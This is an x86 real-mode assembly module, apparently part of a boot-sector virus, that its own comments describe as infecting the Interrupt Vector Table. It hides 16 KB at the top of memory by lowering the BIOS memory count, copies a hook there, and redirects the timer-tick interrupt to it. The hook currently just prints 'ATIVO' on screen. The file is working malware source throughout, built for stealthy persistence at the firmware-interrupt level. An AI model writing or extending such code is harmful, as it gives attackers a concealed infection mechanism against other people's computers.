; IVT Injection Module
; This module creates an invisible RAM space and infects Interrupt Vector Table
; with arbitrary routines.

infect_boot:
    cli

    ; Save registers
    pusha
    push ds
    push es

    ; Creating invisible RAM space for persistency
    mov ax, 0x0040
    mov ds, ax
    mov ax, [0x0013]        ; Getting total RAM in BIOS Data Area
    sub ax, 16              ; Reserves 16 KB for hooks
    mov [0x0013], ax        ; Saves new total value

    ; Calculating address in segment:offset way
    shl ax, 6               ; Segment transform
    mov es, ax
    xor di, di

    ; Copying hooks to invisible memory address
    mov bx, cs
    mov ds, bx
    mov si, timer_hook
    
    mov cx, timer_hook_end - timer_hook ; Calculating code size
    cld
    rep movsb

    ; Infecting IVT
    xor ax, ax
    mov es, ax
    
    mov ax, 0x0040
    mov ds, ax
    mov ax, [0x0013]
    shl ax, 6

    mov word [es:0x70], 0x0000
    mov word [es:0x72], ax

    ; Recovering registers
    pop es
    pop ds
    popa
    sti
    ret

timer_hook:
    push ds
    push es
    pusha

    mov ax, 0xB800
    mov es, ax
    mov di, 142

    mov word [es:di],   0x4F41 ; 'A'
    mov word [es:di+2], 0x4F54 ; 'T'
    mov word [es:di+4], 0x4F49 ; 'I'
    mov word [es:di+6], 0x4F56 ; 'V'
    mov word [es:di+8], 0x4F4F ; 'O'

    popa
    pop es
    pop ds
    iret
timer_hook_end: